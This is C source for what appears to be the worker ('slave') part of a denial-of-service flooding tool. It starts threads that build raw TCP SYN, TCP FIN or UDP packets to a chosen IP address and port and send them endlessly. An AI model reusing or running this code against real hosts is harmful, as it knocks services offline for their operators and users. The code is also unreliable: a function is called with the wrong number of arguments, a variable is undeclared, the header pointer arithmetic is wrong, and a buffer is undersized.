#include <stdio.h>

#include "slave.h"

static struct SlaveTable head;

static void *startup(void *dst);
static struct SlaveTable *alloc_slave(struct Flow flow);

bool slave_create(struct Flow flow)
{
	struct SlaveTable *node = &head;
	pthread_t slave[times];
	int i;

	while( node->next != NULL ) {
		node = node->next;
		if( memcmp(&flow, &node->flow, sizeof(struct Flow)) == 0 ) {
			printf("Already Running\n");
			return false;
		}
	}

	for(i = 0; i < times; i++) {
		if( pthread_create(&slave[i], PTHREAD_CREATE_DETACHED, startup, (void *)&flow) != 0 ) {
			perror("pthread_create(): ");
			return false;
		}
	}

	node->next = alloc_slave(flow, slave);
	if( node->next == NULL) {
		return false;
	}

	return true;
}

bool slave_delete(struct Flow flow)
{
	struct SlaveTable *tmp, *node = &head;
	int times, i;

	while( node->next != NULL ) {
		if( memcmp(&flow, &node->next->flow, sizeof(struct Flow)) == 0 ) {
			tmp = node->next;
			times = tmp->flow.times;

			for(i = 0; i < times; i++) {
				if( pthread_cancel(tmp->tid[i]) != 0 ) {
					perror("pthread_cancel(): ");
					return false;
				}
			}

			node->next = tmp->next;

			free(tmp->tid);
			free(tmp);

			return true;
		}

		node = node->next;
	}

	return false;
}

static void *startup(void *data)
{
	uint8_t packet[IP_MAXPACKET];
	struct Flow *flow = (struct Flow *)data;
	struct ip *iphdr = (struct ip *)(packet + sizeof(struct ether_header));
	struct tcphdr *tcphdr = (struct tcphdr *)(iphdr + sizeof(struct ip));
	struct udphdr *udphdr = (struct udphdr *)(iphdr + sizeof(struct ip));

	/* Set Static Options */
	iphdr->ip_hl = iphdrlen / sizeof(uint32_t); // 5
	iphdr->ip_v = 4;
	iphdr->ip_tos = 0;
	iphdr->ip_off = 0;
	iphdr->ip_ttl = 128;
	memcpy(&iphdr->ip_dst, &flow->ip, sizeof(struct in_addr));

	if( flow->type == UDP ) {
		//random payload, size fix
		iphdr->ip_p = IPPROTO_UDP;
		udphdr->len = htons(sizeof(struct udphdr)+ PAYLOADLEN);
		udphdr->dest = htons(flow->port);

	}else {
		iphdr->ip_p = IPPROTO_TCP;
		tcphdr->dest = htons(flow->port);
		tcphdr->res1 = tcphdr->res2 = 0;
		tcphdr->doff = tcphdrlen / 4;  // 5
		tcphdr->window = htons(8192);
		tcphdr->urg_ptr = 0;
		tcphdr->rst = tcphdr->psh = tcphdr->ack = tcphdr->urg = 0;

		if( flow->type == SYN ) {
			//payload = 05 b4 01 01 04 02
			iphdr->ip_len = htons(iphdrlen + sizeof(struct tcphdr) + 6);
			tcphdr->syn = 1;
			tcphdr->fin = 0;
		}else {
			//payload = 0
			iphdr->ip_len = htons(iphdrlen + sizeof(struct tcphdr));
			tcphdr->syn = 0;
			tcphdr->fin = 1;
		}
	}

	srand(time(NULL) + pthread_self());

	while( 1 ) {
		packet_send(packet, flow->type);
	}
}

static struct SlaveTable *alloc_slave(struct Flow flow)
{
	struct SlaveTable *tmp = (struct SlaveTable *)malloc(sizeof(struct SlaveTable));
	if( tmp == NULL ) {
		perror("malloc(): ");
		return NULL;
	}

	tmp->tid = (pthread_t *)malloc(flow.times);
	if( tmp->tid == NULL ) {
		perror("malloc(): ");
		free(tmp);
		return NULL;
	}

	memcpy(tmp, &flow, sizeof(struct Flow));
	tmp->next = NULL;

	return tmp;
}
